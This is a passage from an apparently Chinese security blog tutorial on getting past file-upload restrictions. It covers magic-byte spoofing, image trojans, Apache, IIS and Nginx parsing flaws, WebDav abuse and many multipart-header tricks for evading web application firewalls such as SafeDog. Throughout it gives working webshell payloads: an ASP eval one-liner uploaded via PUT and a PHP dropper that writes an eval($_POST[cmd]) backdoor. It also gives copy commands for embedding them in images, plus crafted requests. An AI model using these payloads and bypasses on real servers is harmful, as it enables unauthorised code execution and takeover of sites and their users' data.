<li>伪造好文件幻数，<strong>在后面添加一句话木马之后，再添加一些其他的内容</strong>，增大文件的大小。有点像下面的结构：</li>
</ul>
<pre><code>GIF89a
(...some binary data for image...)
&lt;?php phpinfo(); ?&gt;
(... skipping the rest of binary data ...)</code></pre><h4 id="文件加载检测："><a href="#文件加载检测：" class="headerlink" title="文件加载检测："></a>文件加载检测：</h4><ul>
<li>这个是最变态的检测，一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。</li>
</ul>
<h5 id="绕过方法：-3"><a href="#绕过方法：-3" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul>
<li>针对渲染加载测试：代码注入绕过</li>
<li>针对二次渲染测试：攻击文件加载器</li>
</ul>
<h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><ul>
<li>先说下对<code>渲染/加载测试攻击</code>-代码注入绕过,可以用图像处理软件对一张图片进行代码注入。用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的<code>注释区</code>。对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的.</li>
<li>但如果碰到变态的二次渲染,基本上就没法绕过了，估计就只能对文件加载器进行攻击了。</li>
<li>一般进行遇到<code>二次渲染</code>，想绕过，就目前个人经验还没想出方法，它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。能想到的一个思路就是基于数据二义性，即让数据既是图像数据也包含一句话木马代码，就像shellcode 通过数据二义性绕过IDS 检测特殊字符一样的道理，但现在我还不知道怎么构造出这样的图像文件。</li>
<li>如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出</li>
<li><strong>总之对文件完整性检测的绕过，通常就直接用个结构完整的文件进行代码注入即可</strong>,没必要再去测到底是检查的幻数还是文件头结构之类的了。</li>
</ul>
<h4 id="文件内容检测通用绕过方法"><a href="#文件内容检测通用绕过方法" class="headerlink" title="文件内容检测通用绕过方法:"></a>文件内容检测通用绕过方法:</h4><ul>
<li><strong>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入</strong> 即可。比如说常用的<code>图片木马</code></li>
<li>window下用如下命令制作图片木马</li>
</ul>
<pre><code>copy /b 1.jpg+1.php</code></pre><p><code>1.jpg</code>里面就包含了<code>1.php</code>里面的内容</p>
<h2 id="配合Web-Server解析漏洞"><a href="#配合Web-Server解析漏洞" class="headerlink" title="配合Web Server解析漏洞"></a>配合Web Server解析漏洞</h2><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><blockquote>
<p>在<code>Apache 1.x</code>和<code>Apache 2.x</code>中存在解析漏洞</p>
</blockquote>
<p>一个文件名为<code>xxx.x1.x2.x3</code>的文件（例如：<code>index.php.fuck</code>）， Apache会从<code>x3</code>的位置往<code>x1</code>的位置开始尝试解析，如果<code>x3</code>不属于Apache能解析的扩展名，那么Apache会尝试去解析<code>x2</code>的位置，这样<strong>一直从后往前尝试，直到遇到一个能解析的扩展名为止,如果都不认识,则会暴露其源代码</strong>。</p>
<p>以下集成环境都存在<code>扩展名解析顺序漏洞</code>，并且这些环境<strong>都存在对<code>php3</code>文件按照<code>php</code>来解析这个小洞</strong>。</p>
<pre><code>WampServer2.0AllVersion(WampServer2.0i/Apache2.2.11)
WampServer2.1AllVersion(WampServer2.1e-x32/Apache2.2.17)
Wamp5AllVersion(Wamp5_1.7.4/Apache2.2.6)
AppServ2.4AllVersion(AppServ-2.4.9/Apache2.0.59)
AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8)
AppServ2.6AllVersion(AppServ-2.6.0/Apache2.2.8)</code></pre><p>那么Apache认识哪些扩展名呢?在Apache安装目录下<code>/conf/mime.types</code>文件中有详细的扩展名列表,这种方法可以绕过基于黑名单的检查。</p>
<ul>
<li>总结存在该漏洞的Apache版本：<ul>
<li>Apache2.0.x&lt;=2.0.59</li>
<li>Apache2.2.x&lt;=2.2.17<h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3></li>
</ul>
</li>
</ul>
<h4 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h4><p><code>IIS 6.0</code>再解析文件的时候存在以下两个解析漏洞：</p>
<ol>
<li>当<strong>文件</strong>为<code>*.asp;1.jpg</code>时,<code>IIS 6.0</code>会以<code>ASP脚本</code>来执行</li>
<li>当建立<code>*.asa</code>,<code>*.asp</code>格式的<strong>文件夹</strong>时,其目录下的任意文件都将被IIS当作<code>asp</code>文件来解析</li>
<li><code>WebDav(Web-based Distributed Authoring and Versioning)</code>漏洞(对IIS写权限的利用),如果服务器开启<code>WebDav</code>,并且支持<code>PUT</code>,<code>Move</code>,<code>Copy</code>,<code>Delete</code>等方法,就可能存在安全隐患<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5></li>
</ol>
<p>Ⅰ:正常：<code>www.xxx.com/logo.jpg</code></p>
<p>Ⅱ:触发漏洞：<code>www.xxx.com/logo.asp;.jpg</code></p>
<p>按照Ⅰ来访问<code>logo.jpg</code>，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问<code>logo.jpg</code>，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>logo.php;.jpg</code>也会被当成<code>PHP</code>文件执行）</p>
<h5 id="文件夹类型"><a href="#文件夹类型" class="headerlink" title="文件夹类型"></a>文件夹类型</h5><p>Ⅰ:正常：<code>www.xxx.com/image/logo.jpg</code></p>
<p>Ⅱ:触发漏洞：<code>www.xxx.com/image.asp/logo.jpg</code></p>
<p>按照Ⅰ来访问<code>logo.jpg</code>，文件会被当成是<code>jpg</code>图片来解析，想办法，能够按照Ⅱ来访问<code>logo.jpg</code>，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>image.php文件夹</code>下的文件也会被当做<code>PHP</code>文件解析。）</p>
<h5 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h5><blockquote>
<p>攻击者常用<code>PUT</code>方法上传危险脚本文件,测试步骤如下:</p>
</blockquote>
<h6 id="通过OPTIONS探测服务器所支持的HTTP方法"><a href="#通过OPTIONS探测服务器所支持的HTTP方法" class="headerlink" title="通过OPTIONS探测服务器所支持的HTTP方法"></a>通过<code>OPTIONS</code>探测服务器所支持的HTTP方法</h6><pre><code>请求：
OPTIONS / HTTP/1.1
Host:www.example.com

响应：
。。。
Allow:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH
。。。</code></pre><h6 id="通过PUT方法向服务器上传脚本文件"><a href="#通过PUT方法向服务器上传脚本文件" class="headerlink" title="通过PUT方法向服务器上传脚本文件"></a>通过<code>PUT</code>方法向服务器上传脚本文件</h6><pre><code>请求：
PUT /a.txt HTTP/1.1
Host:www.example.com
Content-Length:30

&lt;%eval request(&quot;chopper&quot;)%&gt;</code></pre><h6 id="通过Move或Copy方法改名"><a href="#通过Move或Copy方法改名" class="headerlink" title="通过Move或Copy方法改名"></a>通过<code>Move</code>或<code>Copy</code>方法改名</h6><pre><code>请求：
COPY /a.txt HTTP/1.1
Host:www.example.com
Destination:http://www.example.com/cmd.asp</code></pre><h6 id="使用DELETE方法，攻击者还可以删除服务器上的任意文件"><a href="#使用DELETE方法，攻击者还可以删除服务器上的任意文件" class="headerlink" title="使用DELETE方法，攻击者还可以删除服务器上的任意文件"></a>使用<code>DELETE</code>方法，攻击者还可以删除服务器上的任意文件</h6><pre><code>请求：
DELETE /a.txt HTTP/1.1
Host:www.example.com</code></pre><blockquote>
<p>桂林老兵曾写过一款针对WebDav漏洞的软件:<code>IIS Write</code>,利用这款软件,可以快速探测服务器是否存在WebDav漏洞</p>
</blockquote>
<h4 id="IIS7-0以上"><a href="#IIS7-0以上" class="headerlink" title="IIS7.0以上"></a>IIS7.0以上</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul>
<li><code>IIS7.0/7.5</code>是对<code>php解析</code>时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”<code>/任意文件名.php</code>”就<strong>会按照<code>php</code>的方式去解析</strong>。（例如：<code>webshell.jpg/x.php</code>）</li>
</ul>
<pre><code>IIS7.0(Win2008R1+IIS7.0)
IIS7.5(Win2008R2+IIS7.5)</code></pre><ul>
<li>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”<code>任意文件名/任意文件名.php</code>”这个漏洞其实是出现自<code>php-cgi</code>的漏洞， 所以其实跟IIS自身是无关的。</li>
</ul>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
<li>将shell语句，如  </li>
</ul>
<pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p>
<pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul>
<li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>当前目录下就会生成一句话木马 <code>shell.php</code></li>
</ul>
<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h4 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><ul>
<li>对任意文件名，在后面添加”<code>/任意文件名.php</code>”的解析漏洞，比如图片木马文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行<strong>解析攻击</strong>,那么<code>test.jpg</code>会被当成PHP脚本来解析。注意,此时的<code>x.php</code>是不存在的<blockquote>
<p>这种解析漏洞其实是<code>PHP CGI</code>漏洞,在PHP配置文件中有个关键的选项:<code>cgi.fi: x_pathinfo</code>,这个选项在某些版本中是默认开启的,在开启时访问URL,比如: <code>http://www.xxser.com/x.txt/x.php</code>,<code>x.php</code>是不存在的文件,所以<strong>PHP会<code>向前递归</code>解析</strong>,于是造成了解析漏洞.由于Nginx和PHP配合很容易造成这种漏洞,所以,PHP CGI漏洞常常被认为是Nginx解析漏洞,所以其实跟Nginx自身是无关的。</p>
</blockquote>
</li>
</ul>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><ul>
<li><p>将shell语句，如  </p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>
<p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀）</p>
</li>
<li><p>然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p>
</li>
</ul>
<pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul>
<li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>,当前目录下就会生成一句话木马 <code>shell.php</code></li>
</ul>
<h4 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><ul>
<li>低版本的Nginx可以在任意文件名后面添加<code>%00.php</code>进行<strong>解析攻击</strong>。</li>
</ul>
<pre><code>Nginx0.5.
Nginx0.6.
Nginx0.7. &lt;= 0.7.65
Nginx0.8. &lt;= 0.8.37</code></pre><h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><ul>
<li>比如在图片后附加php代码,然后通过访问<pre><code>xx.jpg%00.php</code></pre>来执行其中的代码</li>
</ul>
<h4 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h4><ul>
<li>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</li>
<li>正常上传一个附加代码的图片<code>test.jpg</code>，访问时后面+<code>空格</code>+<code>\\0</code>+<code>.php</code>，即让图片作为php文件解析</li>
</ul>
<pre><code>&quot;/test.jpg \\0.php&quot;</code></pre><h4 id="配置不当目录穿越"><a href="#配置不当目录穿越" class="headerlink" title="配置不当目录穿越"></a>配置不当目录穿越</h4><ul>
<li>如果绝对路径<code>/home/</code>的URL映射是网站目录<code>/files/</code>，配置写成了<code>/files</code></li>
</ul>
<pre><code>location /files {
    alias /home/;
}</code></pre><ul>
<li>就可以访问<code>/files../</code>，穿越路径，访问到绝对路径根目录<code>/</code>下的文件列表</li>
</ul>
<h2 id="配合操作系统命名规则"><a href="#配合操作系统命名规则" class="headerlink" title="配合操作系统命名规则"></a>配合操作系统命名规则</h2><h3 id="上传不符合windows文件命名规则的文件名"><a href="#上传不符合windows文件命名规则的文件名" class="headerlink" title="上传不符合windows文件命名规则的文件名"></a>上传不符合windows文件命名规则的文件名</h3><pre><code>　　test.asp.
　　test.asp(空格)
　　test.php:1.jpg
　　test.php::$DATA
　　shell.php::$DATA…….</code></pre><p>会被windows系统<strong>自动去掉</strong>不符合规则符号后面的内容。  </p>
<h3 id="linux下后缀名大小写"><a href="#linux下后缀名大小写" class="headerlink" title="linux下后缀名大小写"></a>linux下后缀名大小写</h3><p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul>
<li>校验规则只校验当文件后缀名为<code>asp/php/jsp</code>的文件内容是否为木马。</li>
</ul>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><blockquote>
<p>这里拿php为例，此漏洞主要存在于PHP中</p>
</blockquote>
<ol>
<li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li>
<li>然后再上传一个.php的文件，内容为<code>&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt;</code><blockquote>
<p>文件包含可利用的函数</p>
</blockquote>
</li>
</ol>
<pre><code>include()
include_once()
require()
require_once()
fopen()
readfile()等</code></pre><ol start="3">
<li>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</li>
</ol>
<pre><code>#PHP    
&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; 
#ASP    
&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;
#JSP    
&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;
or  
&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</code></pre><h2 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h2><ol>
<li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li>
<li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</li>
</ol>
<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h3><h4 id="内容中插入干扰字符"><a href="#内容中插入干扰字符" class="headerlink" title="内容中插入干扰字符"></a>内容中插入干扰字符</h4><ul>
<li>前提: 有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</li>
<li>目标: 绕过WAF<strong>对文件内容的校验</strong></li>
<li>方法: 此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221310.png" alt></p>
<h4 id="字段中插入干扰字符"><a href="#字段中插入干扰字符" class="headerlink" title="字段中插入干扰字符"></a>字段中插入干扰字符</h4><ul>
<li>前提: 网站具有任意文件上传漏洞，但是安全狗<strong>拦截危险的脚本文件后缀</strong>，比如<code>php、asp、aspx</code>等</li>
<li>目标: 绕过安全狗对脚本文件后缀的校验</li>
<li>方法: 可以在<code>Content-Disposition</code>字段和<code>filename</code>字段之间插入任意<strong>大于或者等于</strong><code>508</code>个长度的字符，再配合<strong>特殊文件名</strong>（文件名中间需要有<code>分号</code>或者<code>单引号</code>），</li>
</ul>
<pre><code>Content-Disposition:form-data;name=&quot;file&quot;;_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_mwww.cnzxsoft.co_......;Filename=&quot;tea;sd.cer&quot;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221257.png" alt></p>
<h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><h4 id="多个filename"><a href="#多个filename" class="headerlink" title="多个filename"></a>多个<code>filename</code></h4><ul>
<li>针对早期版本安全狗，可以多加一个filename</li>
<li>最终上传成功的文件名是<code>xx.php</code>。但是由于解析文件名时，会解析到第一个<code>xx.txt</code>。正则默认都会匹配到第一个。</li>
</ul>
<pre><code>Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.txt&quot;; filename=&quot;xx.php&quot;</code></pre><h4 id="filename换行"><a href="#filename换行" class="headerlink" title="filename换行"></a><code>filename</code>换行</h4><ul>
<li>PHP支持，Java不支持</li>
</ul>
<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; file
name=&quot;xx.php&quot;</code></pre><ul>
<li><p>下面这种换行PHP也支持。</p>
<pre><code>fi
lename</code></pre></li>
<li><p>在IIS6.0下如果我们换一种书写方式，把<code>filename</code>放在其他地方：  </p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221232.png" alt></p>
<h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h3><ul>
<li>前提: 有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</li>
<li>操作: 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</li>
</ul>
<h3 id="利用waf本身缺陷"><a href="#利用waf本身缺陷" class="headerlink" title="利用waf本身缺陷"></a>利用waf本身缺陷</h3><h4 id="删除实体里面的Content-Type字段"><a href="#删除实体里面的Content-Type字段" class="headerlink" title="删除实体里面的Content-Type字段"></a>删除实体里面的<code>Content-Type</code>字段</h4><ul>
<li>第一种是删除<code>Content</code>整行</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528645576_937160420_1536893309" alt></p>
<ul>
<li>第二种是删除<code>C</code>后面的字符。即删除掉<code>ontent-Type: image/jpeg</code>只留下<code>c</code>，将<code>.php</code>加<code>c</code>后面即可，但是要注意，双引号要跟着<code>c.php</code>。</li>
</ul>
<pre><code>正常包：
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;
Content-Type: image/png

构造包：
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png
C.php&quot;</code></pre><h4 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h4><pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yijuhua.php&quot;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221203.png" alt></p>
<ul>
<li><strong>删除</strong>上面字段<strong>冒号后的空格</strong>或者<strong>name前面的空格</strong>。</li>
</ul>
<h4 id="修改Content-Disposition-name-filename的大小写"><a href="#修改Content-Disposition-name-filename的大小写" class="headerlink" title="修改Content-Disposition,name,filename的大小写"></a>修改<code>Content-Disposition</code>,<code>name</code>,<code>filename</code>的大小写</h4><pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;</code></pre><p>比如<code>name</code>转换成<code>Name</code>或者<code>nAme</code>，<code>Content-Disposition</code>转换成<code>content-disposition</code>等</p>
<h4 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h4><ul>
<li>每次文件上传时的Boundary边界都是一致的：</li>
</ul>
<pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099
Content-Length: 253
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;
Content-Type: application/octet-stream
&lt;%eval request(&quot;a&quot;)%&gt;
-----------------------------4714631421141173021852555099--</code></pre><ul>
<li>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段<code>Boundary</code>不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：Win2k3 + IIS6.0 + ASP</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221136.png" alt></p>
<h4 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h4><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221104.png" alt></p>
<h4 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h4><ul>
<li>在IIS的环境下，上传文件时如果存在多个<code>Content-Disposition</code>的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP  </li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221016.png" alt></p>
<h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><ul>
<li>安全狗有专门的<strong>文件上传防御模块</strong>，禁止<code>cdx、cer、cgi、dll、exe、jsp、php、asp、aspx</code>等类型的文件上传。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221001.png" alt></p>
<p>安全狗进行文件名匹配时候用的是第一个文件名<code>111.jpg</code>，是符合安全要求的，第二个文件没有检查，但是webserver在保存文件的时候却保存了第二个文件名<code>111.php</code>。</p>
<h4 id="windows特殊字符"><a href="#windows特殊字符" class="headerlink" title="windows特殊字符"></a>windows特殊字符</h4><ul>
<li>当我们上传一个文件的filename为<pre><code>shell.php{%80-%99}</code></pre>时：waf可能识别为<pre><code>.php{%80-%99}</code></pre>就会导致被绕过。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647237_911486288_1536893332" alt></p>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647198_1706008271_1536893346" alt></p>
<h4 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换<code>name</code>和<code>filename</code>的顺序</h4><ul>
<li><strong>规定<code>Content-Disposition</code>必须在最前面</strong>，所以只能交换<code>name</code>和<code>filename</code>的顺序。有的WAF可能会匹配<code>name</code>在前面，<code>filename</code>在后面，所以下面姿势会导致Bypass。</li>
</ul>
<pre><code>Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file</code></pre><h4 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a>多个分号</h4><ul>
<li>多个分号,文件解析时，可能解析不到文件名，导致绕过。</li>
</ul>
<pre><code>Content-Disposition: form-data; name=&quot;file&quot;;;; filename=&quot;xx.php&quot;</code></pre><h4 id="在boundary前添加任意字符"><a href="#在boundary前添加任意字符" class="headerlink" title="在boundary前添加任意字符"></a>在<code>boundary</code>前添加任意字符</h4><ul>
<li>如下,在<code>boundary</code>前添加<code>bypass</code>,php支持,java报错</li>
</ul>
<pre><code>Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</code></pre><h4 id="去掉或修改Content-Disposition值"><a href="#去掉或修改Content-Disposition值" class="headerlink" title="去掉或修改Content-Disposition值"></a>去掉或修改<code>Content-Disposition</code>值</h4><ul>
<li>有的WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。</li>
</ul>
<pre><code>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><h4 id="去掉引号"><a href="#去掉引号" class="headerlink" title="去掉引号"></a>去掉引号</h4><pre><code>Content-Disposition: form-data; name=file; filename=&quot;xx.php&quot;
Content-Disposition: form-data; name=&quot;file&quot;; filename=xx.php
Content-Disposition: form-data; name=file; filename=xx.php</code></pre><h4 id="双引号变成单引号"><a href="#双引号变成单引号" class="headerlink" title="双引号变成单引号"></a>双引号变成单引号</h4><pre><code>Content-Disposition: form-data; name=&#39;file&#39;; filename=&#39;xx.php&#39;</code></pre><p>单引号、双引号、不要引号，都能上传。</p>
<h3 id="NTFS-ADS特性"><a href="#NTFS-ADS特性" class="headerlink" title="NTFS ADS特性"></a>NTFS ADS特性</h3><ul>
<li>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647273_580289876_1536893321" alt></p>
<h3 id="其他情况补充"><a href="#其他情况补充" class="headerlink" title="其他情况补充"></a>其他情况补充</h3><h4 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h4><ul>
<li>修改上传的文件名为超长文件名。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221344.png" alt></p>
<ul>
<li>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。  </li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221555.png" alt></p>
<h4 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h4><ul>
<li>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br><code>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</code></li>
</ul>
<h4 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h4><ul>
<li>将下图<code>file1</code>改成了<code>file4</code>，这样就不会把这个文件删除了。（JCMS漏洞）  </li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221521.png" alt></p>
<h4 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h4><ul>
<li>修改上传文件内容，在内容中加很多<code>注释</code>，据说文件大小达到<code>1.5m</code>时，安全狗不在检测。</li>
</ul>
<h4 id="文件名空字符"><a href="#文件名空字符" class="headerlink" title="文件名空字符"></a>文件名空字符</h4><ul>
<li>在<code>:`` ;</code> <code>=</code>添加1个或者多个空格,如在<code>filename=</code>后面加上<code>空格</code>，<code>TAB</code>等空字符再跟上文件名，可以绕过dog的上传检测。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221441.png" alt></p>
<h4 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h4><ul>
<li>在分号的前后加上一定数量的<code>TAB</code>，在测试中是加入了466个TAB字符，可以绕过dog的上传检测。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221421.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="轻量级检测绕过"><a href="#轻量级检测绕过" class="headerlink" title="轻量级检测绕过"></a>轻量级检测绕过</h3><ol>
<li>绕过前端JavaScript检测：使用Burp抓包改包。</li>
<li>绕过服务器端MIME类型检测：使用Burp抓包改包。</li>
</ol>
<h3 id="路径-文件扩展名检测绕过"><a href="#路径-文件扩展名检测绕过" class="headerlink" title="路径/文件扩展名检测绕过"></a>路径/文件扩展名检测绕过</h3><ol>
<li>黑名单检测方式</li>
</ol>
<pre><code>文件名大小写绕过；
名单列表绕过；
特殊文件名绕过；
0x00截断绕过；
.htaccess文件攻击；
本地文件包含漏洞；
Apache解析漏洞；
IIS解析漏洞；
Nginx解析漏洞；</code></pre><ol start="2">
<li>白名单检测方式</li>
</ol>
<pre><code>0x00截断绕过；
